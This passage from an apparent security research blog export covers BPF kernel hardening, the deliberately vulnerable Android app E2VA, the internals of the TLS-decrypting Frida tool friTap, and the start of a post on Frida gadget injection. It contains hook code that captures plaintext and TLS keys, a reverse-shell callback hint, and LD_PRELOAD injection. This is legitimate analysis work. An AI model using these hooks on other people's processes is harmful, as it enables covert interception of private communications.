to have a usable solution.\nAppendix A: Kernel Configuration This section provides a list of compile-time kernel configuration options that can be adjusted to restrict the capabilities of BPF programs. In general, it is recommended to disable unused features in order to reduce the attack surface of a system.\nBPF_SYSCALL=n : Disables the BPF system call. Probably breaks most systemd-based systems. DEBUG_INFO_BTF=n : Disables generation of BTF debug information, i.e., CORE no longer works on this system. Forces attackers to compile on/for the system they want to compromise. BPF_LSM=n : BPF programs cannot be attached to LSM hooks. LOCK_DOWN_KERNEL_FORCE_INTEGRITY=y : Prohibits the use of bpf_probe_write_user. NET_CLS_BPF=n and NET_ACT_BPF=n : BPF programs cannot be used in TC classifier actions. Stops some data exfiltration techniques. FUNCTION_ERROR_INJECTION=n : Disables the function error injection framework, i.e., BPF programs can no longer use bpf_override_return. NETFILTER_XT_MATCH_BPF=n : Disables option to use BPF programs in nftables rules . Could be used to implement malicious firewall rules. BPF_EVENTS=n : Removes the option to attach BPF programs to kprobes, uprobes, and tracepoints. Below are options that limit features that we consider less likely to be used by malware.\nBPFILTER=n : This is an unfinished BPF-based replacement of iptables/nftables (currently not functional). LWTUNNEL_BPF=n : Disables the use of BPF programs for routing decisions in light weight tunnels. CGROUP_BPF=n : Disables the option to attach BPF programs to cgoups. Cgroup programs can monitor various networking-related events of processes in the group. Probably breaks most systemd-based systems. ","permalink":"https://lolcads.github.io/posts/2023/12/bpf_memory_forensics_with_volatility3/","tags":["Linux","kernel","eBPF","BPF","forensics","rootkit","malware"],"title":"BPF Memory Forensics with Volatility 3"},{"categories":null,"content":"Investigating Binary Exploitation for JNI on Android This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the damnvulnerableapp supports the process of binary exploitation on Android.\nWarning The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app. Therefore, beware of this and do not use this app on a device/emulator that contains personal information whatsoever. Always launch the app in a controlled environment. No authentication is necessary to connect to the app and talk to vulnerable modules. Assuming the app is free of bugs, there is a guarantee that only one client can connect at a time.\nE2VA, the damnvulnerableapp In order to properly investigate binary exploitation on Android, an app has been written that allows for running custom vulnerable modules, i.e. Java classes with one entry point, in a separate process. It is remotely controllable and constructed in a way that allows to (re-)run a module multiple times even when it crashed.\nThe app is named E2VA, i.e. Exploitation Experience (with) Vulnerable App. Within this blog series, E2VA and damnvulnerableapp will be used interchangably, so do not get confused!\nThe core of the damnvulnerableapp is a background service, called manager, that handles communication with external users (only one at a time) and translates the messages received into actions to perform. Among other things, the most important actions are:\nSelecting a vulnerable module to be run in a separate process. This has to be done, because it is very likely that the vulnerable module will crash in case we mess up with an exploit. Exiting a vulnerable module. This will shutdown the process that hosts the vulnerable module and revert back to a selection state. Forwarding messages to the vulnerable module. It is possible to forward arbitrary binary data. Of course it is up to the module to accept this or not. E.g. if a vulnerable module internally calls strcpy, sending arbitrary binary data will probably not do the trick. Fetching messages from the vulnerable module. When sending a fetch request, the manager will try to read data from the vulnerable module. Depending on the configurations, this can time out or block forever. Therefore, the usual steps are:\nSelect a module Forward and fetch data until done, i.e. either until the process crashes or exits by itself or is instructed by an external user to terminate. Optionally, when trying to terminate the hosting process, manager can be instructed to do so. As regards selecting a module, the following diagram tries to illustrate this process: Notice that the Zygote process is responsible for creating a new activity by forking. Therefore, the vulnerable process will contain e.g. the same canary as the manager app, which was also forked from Zygote.\nIn addition to selecting a module, the next diagram describes how data is fetched from a module and sent to an external user: If a vulnerable module crashes, e.g. due to a failed exploitation attempt, then the manager will detect this and revert back to the selection state. Therefore, one may select a new module immediately after the old module crashed. It is advised to not flood manager with commands as it takes time to spawn a process or detect that a process died. The latter heavily depends on the configurations and the module\u0026rsquo;s content.\nAlso, the app requires specific privileges in order to avoid being rendered irresponsive after some time (often after 10s). To that end the app requests ACTION_MANAGE_OVERLAY_PERMISSION (which is a runtime permission that can be dangerous, so please run the app on a device/emulator that does not contain personal information whatsoever, just in case damnvulnerableapp gets hijacked by someone other than you). This permission seems to keep the manager alive.\nArchitecture damnvulnerableapp is tested on an x86_64 Pixel 3 emulator that runs Android 12.0.0. The build number is SE1A.220203.002.A1 . Therefore, all exploits that involve shellcode will contain x86_64 assembly.\nRunning Vulnerable Modules Assuming there is a vulnerable module to be run, the manager can be started from Android Studio or via adb . Also damnvulnerableapp should be launched in debug mode. Technically speaking, there is no need to start the app from Android Studio other than being able to attach lldb to the vulnerable module, as well as to adjust configurations to avoid timeouts etc. In order to get to more realistic binary exploitation, one should start with the .apk file, start the app from console and go from there.\nAnother thing to consider is that one should not try to call e.g. execve in the vulnerable process. This comes from the fact that e.g. execve will \u0026ldquo;destroy\u0026rdquo; the actual vulnerable process, thus shutting down the connection to manager. As manager will assume the process to be dead, because the connection broke, it will attempt to fully kill remnants of the vulnerable process and then revert back to a select state. Thus, calling e.g. execve dooms the vulnerabe process to be destroyed by manager. One may think of this as an additional security mechanism, or just a reminder that stealthy exploits are cooler than loud one - shot exploits.\nTypes of vulnerable modules In order to allow for as many perspectives as possible for binary exploitation on Android, each vulnerable module encapsulates one of the following:\na completely different vulnerability class than all the other modules. E.g. buffer - overflow vs. use - after - free. a slightly modified version of a fixed vulnerability class. E.g. a use - after - free vulnerability can result in a Write - What - Where condition or in an attacker being able to execute a chosen function, depending on the implementation. Consider the composition of a vulnerable module: As can be seen in the above diagram, every (currently) module uses JNI functions to introduce vulnerabilities to be exploited. This is where binary exploitation becomes applicable to Java, namely due to native function calls.\nCommunication with vulnerable modules damnvulnerableapp will listen for incoming connections on port 8080. If it is run on an emulator, an external user may connect through nc 127.0.0.1 8080. Before this is possible, one needs to run\n$ adb forward tcp:8080 tcp:8080 Otherwise, establishing a connection is refused. When trying to create a callback (or reverse shell etc.) in an emulator, i.e. establishing a connection from the emulator to the host, use nc 10.0.2.2 \u0026lt;port\u0026gt;. According to docs , 10.0.2.2 is a \u0026ldquo;special alias to your host loopback interface\u0026rdquo;.\nThe manager will only react to messages from an external user, i.e. it uses a request - response model to handle communication. Therefore, an external agent must not assume that it will be informed if the vulnerable module has a non - empty output queue. An external user always has to explicitly ask the manager to fetch available output data.\nIn order to ease communication with the damnvulnerableapp and therefore the vulnerable modules, a client emerged that wraps the most important functionalities required to interact with the modules. The client is based on pwntools , but can easily be translated to work with plain sockets aswell.\nThe following is the implementation of the pwntools - based client (no guarantees for correctness and completeness):\n#!/usr/bin/env python3 from pwn import * from typing import Tuple TIMEOUT = 5 class PwnClient: def __init__(self, host : str, port : int): self.io = remote(host, port) self.handshake() def handshake(self) -\u0026gt; None: self.send(b\u0026#39;USER\u0026#39;, b\u0026#39;INIT\u0026#39;, capsule_type=b\u0026#39;INIT\u0026#39;) self.receive() def close(self) -\u0026gt; None: self.send(b\u0026#39;\u0026#39;, b\u0026#39;SHUTDOWN\u0026#39;) self.receive() self.send(b\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;, capsule_type=b\u0026#39;ACK\u0026#39;) self.io.close() def send(self, message : bytes, operation, capsule_type=b\u0026#39;CONTENT\u0026#39;) -\u0026gt; None: capsule = capsule_type + b\u0026#39; \u0026#39; + operation + b\u0026#39; CONTENT \u0026#39; + message length = len(capsule) self.io.send(p32(length, endian=\u0026#39;big\u0026#39;)) self.io.send(capsule) def block_receive(self, num_bytes : int) -\u0026gt; bytes: message = b\u0026#39;\u0026#39; while (len(message) \u0026lt; num_bytes): received = self.io.recv(1, timeout=TIMEOUT) if (received and len(received) \u0026gt; 0): message += received return message \u0026#34;\u0026#34;\u0026#34; Returns: (length, capsule_type, operation, content) \u0026#34;\u0026#34;\u0026#34; def receive(self) -\u0026gt; Tuple[int, bytes, bytes, bytes]: length = u32(self.block_receive(4), endian=\u0026#39;big\u0026#39;) message = self.block_receive(length) split_message = message.split(b\u0026#39; \u0026#39;) operation = None if (len(split_message) \u0026gt;= 2): operation = split_message[1] content = None if (len(split_message) \u0026gt;= 4): content = b\u0026#39; \u0026#39;.join(split_message[3:]) return (length, split_message[0], operation, content) def select(self, module_name : str) -\u0026gt; str: self.send(module_name.encode(\u0026#39;utf-8\u0026#39;), b\u0026#39;SELECT\u0026#39;) return self.receive()[3].decode() def forward(self, message : bytes) -\u0026gt; str: self.send(message, b\u0026#39;FORWARD\u0026#39;) return self.receive()[3].decode() def fetch(self) -\u0026gt; bytes: self.send(b\u0026#39;\u0026#39;, b\u0026#39;FETCH\u0026#39;) return self.receive()[3] def exit(self) -\u0026gt; str: self.send(b\u0026#39;\u0026#39;, b\u0026#39;EXIT\u0026#39;) res = self.receive()[3].decode() self.io.close() return res A sample program could look like this:\n... def main(): io = PwnClient(\u0026#39;127.0.0.1\u0026#39;, 8080) print(io.fetch()) io.forward(b\u0026#39;test123\u0026#39;) print(io.fetch()) io.exit() if (__name__ == \u0026#39;__main__\u0026#39;): main() Summary In this post, damnvulnerableapp aka E2VA was presented as an Android app that manages custom vulnerable modules that can be used for vulnerability research on Android OS\u0026rsquo;s. To that end, the modules try to cover different vulnerability classes to allow for discovery of Android - specific difficulities in binary exploitation. In our next post we dive into the first vulnerability and how to exploit it. Stay tuned.\nGetting started E2VA can be downloaded here: https://github.com/fkie-cad/eeva ","permalink":"https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/","tags":["Android","Binary Exploitation","JNI","E²VA"],"title":"Diving into the art of userspace exploitation under Android - Introducing E²VA (Part 1)"},{"categories":null,"content":"Encryption - a curse and a blessing at the same time Digital communication in today\u0026rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades. With the introduction of high-performance and digitally secure cryptographic methods, such as SSL/TLS, today\u0026rsquo;s digital communications are predominantly encrypted. Whereas back then, for example, an attacker could hang himself between the client and the server and read the data traffic without encryption, today all he sees is a jumble of letters. Encryption is truly a boon for protecting sensitive personal data, but it also has its drawbacks, as with almost everything. Encrypted communications negate the ability to analyze communications, which is very relevant when reverse engineering malware or researching vulnerabilities.\nMan-in-the-middle proxy as a solution One of the best known solutions to intercept and decrypt encrypted communications is the so-called \u0026ldquo;man-in-the-middle\u0026rdquo; attack. In this case, the attacker or analyst pretends to be a trustworthy communication partner to the client. However, since the client often does not know how the client\u0026rsquo;s communication partner, referred to hereafter as the server, communicates or behaves, the attacker (or analyst) forwards the communication to the server and pretends to be the client. To establish encrypted communication via TLS, for example, a certificate is required, which the server sends to the client when the connection is established. So a connection is established between the MitM proxy and the client using a MitM certificate (fake certificate) and a connection is established between the MitM proxy and the server using a server certificate. Due to this setup, the communication between client and server is routed through the MitM proxy and can be processed on it without encryption.\nThere are some preventive measures that can prevent such an attack, especially on mobile devices. One of the best known measures is the so-called \u0026ldquo;certificate pinning\u0026rdquo;. This involves storing the expected server certificate or a hash of the certificate in the binary of the client itself. If the client subsequently receives a certificate from the alleged server, this is compared with the embedded certificate or verified by means of a hash value. If this verification is not successful, then the connection is aborted.\nA possible solution to this problem would be to modify the pinning code itself:\nThis approach is possible, but in many cases it is very time-consuming, since the implementations of the pinning can differ greatly depending on the version and the analysis of the code must be performed again for each new version if the pinning is not used from a well known library. In addition, there are, especially with malware, several different implementations of pinning, which is why a general approach often does not lead to the goal.\nOur approach: One thing is certain: in order to get the unencrypted communication, the client application must be \u0026ldquo;attacked\u0026rdquo;. This led us to ask why we don\u0026rsquo;t directly extract the decrypted SSL/TLS stream or the key material from the target appliaction.\nAbstraction of using a library Most applications that perform encrypted communication use a widely available library to do so, such as OpenSSL and NSS. These libraries try to keep the encryption of the data as abstract as possible, so that the use of the library is very convenient. Among other things, they encapsulate the TLS handshake and the sending and receiving of encrypted data.\nA common program flow utilizing a TLS library looks like this:\nThe application wants to establish a secure TLS connection to a server. It uses the TLS library for this purpose, which performs the handshake as shown below:\nAfter establishing the TLS connection, data can now be sent and received using the read and write functions of the TLS library as shown in the figure below.\nExactly these TLS-read and TLS-write functions are used by the target application to read and write the plaintext from TLS stream, respectively. Hence our tool, friTap , is hooking them in order to receive the plaintext of the encrypted packets. Beside this friTap is also able to extract the used TLS keys.\nfriTap usage friTap comes with two operation modes. One is to get the plaintext from the TLS payload as PCAP and the other is to get the used TLS keys. In order to get the decrypted TLS payload we need the -p parameter:\n$ ./friTap.py –m –p decryptedTLS.pcap \u0026lt;target_app\u0026gt; … [*] BoringSSL.so found \u0026amp; will be hooked on Android! [*] Android dynamic loader hooked. [*] Logging pcap to decryptedTLS.pcap The -m paramter indicates that we are analysing a mobile application in the above example. For extracting the TLS keys from a target application we need the -k parameter:\n$ ./friTap.py –m –k TLS_keys.log \u0026lt;target_app\u0026gt; … [*] BoringSSL.so found \u0026amp; will be hooked on Android! [*] Android dynamic loader hooked. [*] Logging keylog file to TLS_keys.log As a result friTap writes all TLS keys to the TLS_keys.log file using the NSS Key Log Format .\nfriTap internals After understanding the overall approach lets dive into the internals of friTap .\nFRIDA friTap is built on the dynamic instrumentation toolkit FRIDA , which allows developers, reverse engineers and security researchers to dynamically analyze and instrument programs. FRIDA allows you to execute Javascript code within the target program, which gives you the ability to hook functions, read and write program memory, execute custom code, and more. A Python API is provided for using FRIDA, which makes it very user-friendly.\nTo accomplish this, FRIDA injects the QuickJS Javascript engine (can also be changed to the V8 runtime ) into the target process and an agent that acts as communication interfaces between the instrumentarized process and its own tool later on. After injection of the engine and the agent, the user is able to execute own Javascript code inside the target process and receive data from it. More on the inner workings of FRIDA can be found here .\nProgram flow A rough overview of the flow of friTap can be seen in the following diagrams, which are explained in more detail in the sections that follow. The first step after loading the friTap JS script into the target process is to identify the operating system (os) of the target process:\nThen an os specific agent will be loaded. This agent enumerates all loaded libraries/modules from the target process. FRIDA provides a function for this purpose that returns for each loaded module its name, base address, size and path in the file system. Based on the name of the modules friTap can identify a SSL/TLS library. Depending on the version and operating system, the name of the loaded module can vary greatly. friTap tries to cover all potential module names of supported libraries as best as possible using expressive regex. The operating system-specific agent determines which libraries are supported and how its hooking is implemented:\nWhen a supported library is detected, friTap tries to hook the SSL-read(), SSL-write() and SSL-keyexport() functions of the respective library and all other functions required for this. Sometimes the target library doesn\u0026rsquo;t provide a key export function, in those cases friTap have to parse the heap in order to find the keys in the memory of the target process.\nNext we want to dive into the implementation details of the mentioned parts of friTap. As mentioned above friTap checks at first on which plattform our target process is running and invoke than its respective os specific agent:\nfunction load_os_specific_agent() { if(isWindows()){ load_windows_hooking_agent() }else if(isAndroid()){ load_android_hooking_agent() }else if(isLinux()){ load_linux_hooking_agent() }else if(isiOS()){ load_ios_hooking_agent() }else if(isMacOS()){ load_macos_hooking_agent() }else{ log(\u0026#34;Error: not supported plattform!\\nIf you want to have support for this plattform please make an issue at our github page.\u0026#34;) } } This agent installs the hooks for the detected libraries. First the enumerations of the supported SSL/TLS libaries are safed (module_library_mapping) and provided for the different hooks. In the following we see how this is done for Android:\nexport function load_android_hooking_agent() { module_library_mapping[plattform_name] = [[/.*libssl_sb.so/, boring_execute],[/.*libssl\\.so/, boring_execute],[/.*libgnutls\\.so/, gnutls_execute],[/.*libwolfssl\\.so/, wolfssl_execute],[/.*libnspr[0-9]?\\.so/,nss_execute], [/libmbedtls\\.so.*/, mbedTLS_execute]]; install_java_hooks(); hook_native_Android_SSL_Libs(module_library_mapping); hook_Android_Dynamic_Loader(module_library_mapping); } If supported, friTap installs java based hooks. Right now these java hooks only installed for Android applications. Next the plattform (operating system) specific hooks are installed. After a supported SSL/TLS library has been found, the search for the corresponding functions (read, write, key export) inside the module is started. This is done using the mapped functions from module_library_mapping. When we have a closer look into the enumerations we can see that for each detected library an appropriate so called \u0026lt;libname\u0026gt;-execute function is mapped. This mapped function contains the implementation details of the SSL-read(), SSL-write() and SSL-keyexport() hooks. Strictly speaking, for each identified library, its platform-specific hook (read, write, export) is installed for the corresponding library. Fortunately, the majority of hooking implementations are platform independent, with only a few platforms having differences. This means that the overall hooking implementation for a specific library is provided by an os independent super class. In the following we see the Android OpenSSL hooking implementation with the implementations inherited from its superclass:\n/* from openssl_boringssl_android.ts */ export class OpenSSL_BoringSSL_Android extends OpenSSL_BoringSSL { constructor(public moduleName:String, public socket_library:String){ super(moduleName,socket_library); } execute_hooks(){ this.install_plaintext_read_hook(); this.install_plaintext_write_hook(); this.install_tls_keys_callback_hook(); } } export function boring_execute(moduleName:String){ var boring_ssl = new OpenSSL_BoringSSL_Android(moduleName,socket_library); boring_ssl.execute_hooks(); } The specific functions of the library are only then hooked in the superclass. This is done by library\u0026rsquo;s specific function names (SSL_read, SSL_write\u0026hellip;) which are passed to our readAddresses() function in order to obtain the addresses for hooking.\n/* super class openssl_boringssl.ts */ export class OpenSSL_BoringSSL { // global variables library_method_mapping: { [key: string]: Array\u0026lt;String\u0026gt; } = {}; addresses: { [key: string]: NativePointer }; ... constructor(public moduleName:String, public socket_library:String,public passed_library_method_mapping?: { [key: string]: Array\u0026lt;String\u0026gt; }){ if(typeof passed_library_method_mapping !== \u0026#39;undefined\u0026#39;){ this.library_method_mapping = passed_library_method_mapping; }else{ this.library_method_mapping[`*${moduleName}*`] = [\u0026#34;SSL_read\u0026#34;, \u0026#34;SSL_write\u0026#34;, \u0026#34;SSL_get_fd\u0026#34;, \u0026#34;SSL_get_session\u0026#34;, \u0026#34;SSL_SESSION_get_id\u0026#34;, \u0026#34;SSL_new\u0026#34;, \u0026#34;SSL_CTX_set_keylog_callback\u0026#34;] this.library_method_mapping[`*${socket_library}*`] = [\u0026#34;getpeername\u0026#34;, \u0026#34;getsockname\u0026#34;, \u0026#34;ntohs\u0026#34;, \u0026#34;ntohl\u0026#34;] } this.addresses = readAddresses(this.library_method_mapping); ... } ... FRIDA provides with the ApiResolver a function enumerateMatches(\u0026quot;exports:\u0026quot; + library_name + \u0026quot;!\u0026quot; + method): This is passed the name of the function, the name of the module and the type (export, import) in a single string. If a match is found, information about this function is returned, of which friTap only needs and stores the address. Below is the whole listing of friTap\u0026rsquo;s readAddresses() function:\n//File: agent/shared/shared_functions.ts /** * Read the addresses for the given methods from the given modules * @param {{[key: string]: Array\u0026lt;String\u0026gt; }} library_method_mapping A string indexed list of arrays, mapping modules to methods * @return {{[key: string]: NativePointer }} A string indexed list of NativePointers, which point to the respective methods */ export function readAddresses(library_method_mapping: { [key: string]: Array\u0026lt;String\u0026gt; }): { [key: string]: NativePointer } { var resolver = new ApiResolver(\u0026#34;module\u0026#34;) var addresses: { [key: string]: NativePointer } = {} for (let library_name in library_method_mapping) { library_method_mapping[library_name].forEach(function (method) { var matches = resolver.enumerateMatches(\u0026#34;exports:\u0026#34; + library_name + \u0026#34;!\u0026#34; + method) var match_number = 0; var method_name = method.toString(); if(method_name.endsWith(\u0026#34;*\u0026#34;)){ method_name = method_name.substring(0,method_name.length-1) } if (matches.length == 0) { throw \u0026#34;Could not find \u0026#34; + library_name + \u0026#34;!\u0026#34; + method } else if (matches.length == 1){ devlog(\u0026#34;Found \u0026#34; + method + \u0026#34; \u0026#34; + matches[0].address) }else{ for (var k = 0; k \u0026lt; matches.length; k++) { if(matches[k].name.endsWith(method_name)){ match_number = k; devlog(\u0026#34;Found \u0026#34; + method + \u0026#34; \u0026#34; + matches[match_number].address) break; } } } addresses[method_name] = matches[match_number].address; }) } return addresses } After all relevant function addresses are available, friTap finally installs the hooks when entering or leaving the respective functions. More on this later.\nIt is possible that a program to be analyzed does not load an SSL/TLS library at program start or loads an SSL/TLS library again at another time. For this case friTap hooks a function in the respective standard library of the operating system. The following is the implementation for Android:\n/* File agent/android/android_agent.ts */ function hook_Android_Dynamic_Loader(module_library_mapping: { [key: string]: Array\u0026lt;[any, (moduleName: string)=\u0026gt;void]\u0026gt; }): void{ ... const regex_libdl = /.*libdl.*\\.so/ const libdl = moduleNames.find(element =\u0026gt; element.match(regex_libdl)) ... let dl_exports = Process.getModuleByName(libdl).enumerateExports() var dlopen = \u0026#34;dlopen\u0026#34; for (var ex of dl_exports) { if (ex.name === \u0026#34;android_dlopen_ext\u0026#34;) { dlopen = \u0026#34;android_dlopen_ext\u0026#34; break } } Interceptor.attach(Module.getExportByName(libdl, dlopen), { onEnter: function (args) { this.moduleName = args[0].readCString() }, onLeave: function (retval: any) { if (this.moduleName != undefined) { for(let map of module_library_mapping[plattform_name]){ let regex = map[0] let func = map[1] if (regex.test(this.moduleName)){ log(`${this.moduleName} was loaded \u0026amp; will be hooked on Android!`) func(this.moduleName) } } } } }) console.log(`[*] Android dynamic loader hooked.`) ... } Now all functions for extracting the streams or the key material should have been identified so that friTap can use the hooks for extracting the plaintext payload or the TLS keys.\nLets dive into the hooking implementations itself. The way of instrumentation varies partly between the different supported libraries and plattform, but all follow the same principle.\nHooking the read function The read functions of the libraries generally have function signature of the following structure:\nint read (void*, void*, int) The first parameter is a pointer to an SSL object that holds all information about the SSL session in use in the background. This object is used to identify the SSL/TLS stream over which data is received. The second parameter is a pointer to a temporary buffer that holds unencrypted data received from the SSL/TLS stream. The third parameter is the maximum number of bytes that can be stored in the buffer for data received from the SSL/TLS stream.\nFor friTap, the second parameter, the buffer containing the unencrypted data, is the important one. To read the contents of this buffer, friTap needs the pointer to it and the number of bytes that were received. FRIDA\u0026rsquo;s interceptor allows to define hooks for function start and end. These callbacks are executed before the execution and after the execution of the function. The callback function for the hook of the function start is passed all parameters of the hooked function. Thus the callback function is able to extract and manipulate all passed parameters. friTap takes advantage of this and extracts from the parameters the second pointer of the read function, which points to the buffer that holds the received, unencrypted data. The implementation is here as an example (using OpenSSL) for the other implementations and it looks like this:\nInterceptor.attach(addresses[\u0026#34;SSL_read\u0026#34;], { onEnter: function (args: any) { var message = getPortsAndAddresses(SSL_get_fd(args[0]) as number, true, addresses) message[\u0026#34;ssl_session_id\u0026#34;] = getSslSessionId(args[0]) message[\u0026#34;function\u0026#34;] = \u0026#34;SSL_read\u0026#34; this.message = message this.buf = args[1] } ... }) The pointer to the buffer is in the paramter array named args, strictly speaking in the second position (it is the second function parameter). This is now saved in the execution context using this.buf = args[1], since the buffer will only be filled with the received data after the read function has been executed.\nThe hook of the function end has exactly one parameter, the return value of the function. In the case of the read function, this is the number of bytes received, which is important for reading the buffer. The hook for the end of the function looks like the following, again demonstrated with OpenSSL as an example:\nInterceptor.attach(addresses[\u0026#34;SSL_read\u0026#34;], { ... onLeave: function (retval: any) { retval |= 0 // Cast retval to 32-bit integer. if (retval \u0026lt;= 0) { return } const buffer_content = this.buf.readByteArray(retval) this.message[\u0026#34;contentType\u0026#34;] = \u0026#34;datalog\u0026#34; send(this.message, buffer_content) } }) retval is the return value of the read function, i.e. the number of bytes received. The previously saved pointer to the buffer can now be read with readByteArray(). By the return value of the read function friTap knows exactly how many bytes have to be read from the buffer. The extracted bytes are then stored in a dictionary object, which in addition to the data also contains information such as port numbers, sender and receiver addresses, etc. . This is then sent via send() from the target process to the main script (python script ), which then processes this information.\nHooking the write function As with the read functions, the write functions have the same function signature for all libraries supported by friTap:\nint write (void*, void*, int) The first parameter is a pointer to an SSL object that holds all information about the SSL session being used in the background. This object is used to identify the SSL/TLS stream over which data is sent. The second parameter is a pointer to a buffer that holds the data to be transmitted, in unencrypted form. The third parameter specifies how many bytes from the referenced buffer should be sent over the associated SSL/TLS stream.\nUnlike the read function, all information necessary for friTap is already available before function execution. The implementation is again exemplified with the implementation of OpenSSL:\nInterceptor.attach(addresses[\u0026#34;SSL_write\u0026#34;], { onEnter: function (args: any) { var message = getPortsAndAddresses(SSL_get_fd(args[0]) as number, false, addresses) message[\u0026#34;ssl_session_id\u0026#34;] = getSslSessionId(args[0]) message[\u0026#34;function\u0026#34;] = \u0026#34;SSL_write\u0026#34; message[\u0026#34;contentType\u0026#34;] = \u0026#34;datalog\u0026#34; const bytesToBeSent = args[1].readByteArray(parseInt(args[2])) send(message, bytesToBeSent) } }) args[1] is the pointer to the buffer, args[2] the number of bytes to send. With readByteArray() the bytes to send can be copied from the buffer. The extracted bytes are then stored in a dictionary object, which contains besides the data also information like port numbers, sender and receiver address etc.. This is then sent via send() from the target process to the main script (Python script), which then processes this information.\nKey extraction In addition to hooking the read and write functions, friTap also provides the ability to export all keys created/received during the handshake. These keys can then be used to decrypt encrypted TLS traffic. Wirehsark provides the ability to specify a keylog file that friTap created when the client connected to the server. The implementation of this functionality varies widely. This is due to the default behavior of the individual libraries, especially depending on the operating system.\nAgain, we would like to show an example, based on the implementation of OpenSSL on linux:\nconst SSL_CTX_set_keylog_callback = ObjC.available ? new NativeFunction(addresses[\u0026#34;SSL_CTX_set_info_callback\u0026#34;], \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) : new NativeFunction(addresses[\u0026#34;SSL_CTX_set_keylog_callback\u0026#34;], \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) const keylog_callback = new NativeCallback(function (ctxPtr, linePtr: NativePointer) { var message: { [key: string]: string | number | null } = {} message[\u0026#34;contentType\u0026#34;] = \u0026#34;keylog\u0026#34; message[\u0026#34;keylog\u0026#34;] = linePtr.readCString() send(message) }, \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) If OpenSSL is selected as a dynamically loaded library, many functions are exported by default. Fortunately, the function SSL_CTX_set_keylog_callback (linux desktop) is also exported. This function gives the user the ability to define a callback function that will be called whenever new key material is generated or received. This function is passed two parameters when it is called: An SSL object associated with the connection and the newly generated or received key material in the form of a string. FRIDA allows you to define your own callback functions, which we did for this use case. friTap creates a new callback function that reads the passed string and stores it in a dictionary object, which is sent to the main script (python script) and processed by it (log or write out).\nIn order to register the own callback, the function SSL_CTX_set_keylog_callback must be called once, before the handshake, with the callback function as parameter. friTap hooks the SSL_new method for this. This function is called before the handshake, but also after the SSL context has been created, i.e. the binding options have already been set so that the callback function can receive the key material of the subsequent handshake.\nFor each operating system, friTap knows the usual library/module and the function that is ultimately responsible for loading the new library. When a new library is loaded into program memory, the name of the new module is checked to see if it matches any of the SSL/TLS library names. If this is the case, the usual read, write and key export functions are hooked.\nSpecial Thanks We like to thank our colleague Max J. Ufer for his initial work in creating friTap. Further we like to thank Martin Lambertz and Jan-Niclas Hilgert for their feedback while working on friTap. Finally we have to thank Ole André Vadla Ravnås for his tireless efforts in the development of FRIDA.\nGetting started friTap can be downloaded here: https://github.com/fkie-cad/friTap ","permalink":"https://lolcads.github.io/posts/2022/08/fritap/","tags":["frida","network","TLS","TLS decryption"],"title":"friTap - Decrypting TLS on the fly"},{"categories":null,"content":"Make Frida Great Again In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, Frida is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.\nIn this blog post, I will describe how to overcome a main issue of Frida such that Frida is applicable to a broader set of binaries. For that I will give in-depth explanations on the different techniques being used to solve the issue. Also I will showcase the use of a python library that emerged as a result of this issue.\nStumbling Frida - The Issue Frida internally uses the ptrace - syscall to attach to running processes. Notice that using ptrace requires the CAP_SYS_PTRACE - capability, which is a requirement for tracing arbitrary processes. Thus, an unprivileged user cannot trace e.g. a privileged process. An example is tracing a process on an Android device. If this device is not rooted, then it will not be possible to use ptrace on arbitrary processes.\nLets assume that a user is capable of using ptrace and that user wants to analyse a potentially malicious binary that employs anti-debugging techniques like the following one\nif (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) { // traced: nice behaviour } else { // not traced: evil behaviour } Then Frida can again not be used to analyse all functionality of the process. This is due to the fact that for each tracee there may at most be one tracer.\nFrida Gadget Of course the developers of Frida are well aware of this issue. Therefore they provide a shared object file called frida-gadget.so (downloaded here ), which is to be injected manually into the target process. There are different kinds of interaction types that specify how the connection between the frida server and the frida client is set up.\nIn the following you can see an example of how to use frida-gadget.so with its default interaction type listen. First, for the target binary:\nLD_PRELOAD=/path/to/frida-gadget.so /path/to/target Now, in order to e.g. trace syscalls that start with \u0026ldquo;read\u0026rdquo;:\nfrida-trace -H 127.0.0.1:27042 -n \u0026#34;Gadget\u0026#34; -i \u0026#34;read*\u0026#34; -H 127.0.0.1:27042: Specifies the frida server to connect to. In this case the server is located on localhost on the default port 27042. -n \u0026ldquo;Gadget\u0026rdquo;: Name of the process to attach to. In this setting, the name of the target process will always be \u0026ldquo;Gadget\u0026rdquo;! -i \u0026ldquo;read*\u0026rdquo;: Specifies what function(s) to trace. Using LD_PRELOAD is not practical in all cases as e.g. it cannot be used to instrument an SUID - binary. For a more general solution, we need another approach.\nELF - based Injection The approach used to make a process load frida-gadget.so at startup is ELF - based injection. In order to support as many platforms as possible, those injection techniques will be based on System V gABI . It describes the abstract structure of an ELF - file, occasionally leaving out details to be specified by a corresponding Processor Supplement (e.g. ARM64 or AMD64 ).\nUnfortunately, it is not possible to fully implement ELF - based injection without using architecture - or OS - dependent information. Thus, the following platform-specific assumptions were made when designing the techniques:\nELF - binary is run on ARM64 and Android: This must currently be ensured, because adjusting virtual addresses and file offsets in the binary enforces patching Relocation Tables , which are highly platform - dependent. There are no other platform - specific tags for .dynamic - entries other than DT_VERSYM DT_VERDEF DT_VERNEED One of the parsers (see Rule of Two ) is build for AMD64 only. Thus the python library will only work on AMD64. Technically, one can try to make sense of the makefiles and change the compilation such that it supports other architectures aswell. ELF - based injection can be split into two (or more) steps:\nCode injection: Insert code into binary, i.e. make it available for internal structures. Code execution: Make injected code executable, i.e. manipulate structures like entry point such that the injected code will be part of the control flow. There is one special technique that cannot be split into two parts: .dynamic - based injection.\nRule of Two The techniques to be explained are implemented in a python library , which mainly uses LIEF . LIEF is a binary parser that among other things supports parsing and manipulating ELF - files. However there is a problem with LIEF, i.e. 